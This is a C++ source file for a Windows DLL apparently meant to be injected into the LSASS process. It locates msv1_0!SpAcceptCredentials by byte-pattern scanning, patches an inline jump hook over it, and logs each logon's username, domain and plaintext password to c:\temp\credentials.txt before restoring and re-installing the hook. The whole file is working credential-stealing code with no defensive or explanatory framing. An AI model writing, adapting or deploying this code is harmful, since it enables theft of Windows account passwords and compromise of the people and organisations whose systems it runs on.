// lsass_lib.cpp : Этот файл содержит функцию "main". Здесь начинается и заканчивается выполнение программы.
//

#include "pch.h"
#include <iostream>
#include <Windows.h>
#define SECURITY_WIN32
#include <Sspi.h>
#include <ntsecapi.h>
#include <ntsecpkg.h>

using _SpAcceptCredentials = NTSTATUS(NTAPI *)(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials);
char startOfPatternSpAccecptedCredentials[] = { 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xf1, 0x48 };
char bytesToPatchSpAccecptedCredentials[12] = { 0x48, 0xb8 };
PVOID patternStartAddressOfSpAccecptedCredentials = NULL;
PVOID addressOfSpAcceptCredentials = NULL;
char bytesToRestoreSpAccecptedCredentials[12] = { 0 };
void installSpAccecptedCredentialsHook();

PVOID GetPatternMemoryAddress(char *startAddress, char *pattern, SIZE_T patternSize, SIZE_T searchBytes)
{
    unsigned int index = 0;
    PVOID patternAddress = NULL;
    char
        *patternByte = 0,
        *memoryByte = 0;
    do
    {
        if (startAddress[index] == pattern[0])
        {
            for (size_t i = 1; i < patternSize; i++)
            {
                *(char *)&patternByte = pattern[i];
                *(char *)&memoryByte = startAddress[index + i];

                if (patternByte != memoryByte)
                {
                    break;
                }

                if (i == patternSize - 1)
                {
                    patternAddress = (LPVOID)(&startAddress[index]);
                    return patternAddress;
                }
            }
        }
        ++index;
    } while (index < searchBytes);

    return (PVOID)NULL;
}

NTSTATUS NTAPI hookedSpAccecptedCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
    DWORD bytesWritten = 0;
    HANDLE file = CreateFileW(L"c:\\temp\\credentials.txt", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, NULL, NULL);
    _SpAcceptCredentials originalSpAcceptCredentials = (_SpAcceptCredentials)addressOfSpAcceptCredentials;

    // intercept credentials and write them to disk
    WriteFile(file, PrimaryCredentials->DownlevelName.Buffer, PrimaryCredentials->DownlevelName.Length, &bytesWritten, NULL);
    WriteFile(file, "@", 2, &bytesWritten, NULL);
    WriteFile(file, PrimaryCredentials->DomainName.Buffer, PrimaryCredentials->DomainName.Length, &bytesWritten, NULL);
    WriteFile(file, ":", 2, &bytesWritten, NULL);
    WriteFile(file, PrimaryCredentials->Password.Buffer, PrimaryCredentials->Password.Length, &bytesWritten, NULL);
    CloseHandle(file);

    // unhook msv1_0!SpAcceptCredentials
    WriteProcessMemory(GetCurrentProcess(), addressOfSpAcceptCredentials, bytesToRestoreSpAccecptedCredentials, sizeof(bytesToRestoreSpAccecptedCredentials), NULL);

    // hook msv1_0!SpAcceptCredentials again with a delay so that originalSpAcceptCredentials() can execute
    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)installSpAccecptedCredentialsHook, NULL, NULL, NULL);

    // call original msv1_0!SpAcceptCredentials
    return originalSpAcceptCredentials(LogonType, AccountName, PrimaryCredentials, SupplementalCredentials);
}

void installSpAccecptedCredentialsHook()
{
    Sleep(1000 * 5);
    HMODULE targetModule = LoadLibraryA("msv1_0.dll");
    DWORD bytesWritten = 0;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetModule;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetModule + dosHeader->e_lfanew);
    SIZE_T sizeOfImage = ntHeader->OptionalHeader.SizeOfImage;

    // find address of msv1_0!SpAcceptCredentials
    patternStartAddressOfSpAccecptedCredentials = (LPVOID)(DWORD_PTR)GetPatternMemoryAddress((char *)targetModule, startOfPatternSpAccecptedCredentials, sizeof(startOfPatternSpAccecptedCredentials), sizeOfImage);
    addressOfSpAcceptCredentials = (LPVOID)((DWORD_PTR)patternStartAddressOfSpAccecptedCredentials - 16);

    // store first sizeof(bytesToRestoreSpAccecptedCredentials) bytes of the original msv1_0!SpAcceptCredentials routine
    std::memcpy(bytesToRestoreSpAccecptedCredentials, addressOfSpAcceptCredentials, sizeof(bytesToRestoreSpAccecptedCredentials));

    // hook msv1_0!SpAcceptCredentials with "mov rax, hookedSpAccecptedCredentials; jmp rax";
    DWORD_PTR addressBytesOfhookedSpAccecptedCredentials = (DWORD_PTR)&hookedSpAccecptedCredentials;
    std::memcpy(bytesToPatchSpAccecptedCredentials + 2, &addressBytesOfhookedSpAccecptedCredentials, sizeof(&addressBytesOfhookedSpAccecptedCredentials));
    std::memcpy(bytesToPatchSpAccecptedCredentials + 2 + sizeof(&addressBytesOfhookedSpAccecptedCredentials), (PVOID)&"\xff\xe0", 2);
    WriteProcessMemory(GetCurrentProcess(), addressOfSpAcceptCredentials, bytesToPatchSpAccecptedCredentials, sizeof(bytesToPatchSpAccecptedCredentials), (SIZE_T*)&bytesWritten);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        installSpAccecptedCredentialsHook();
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
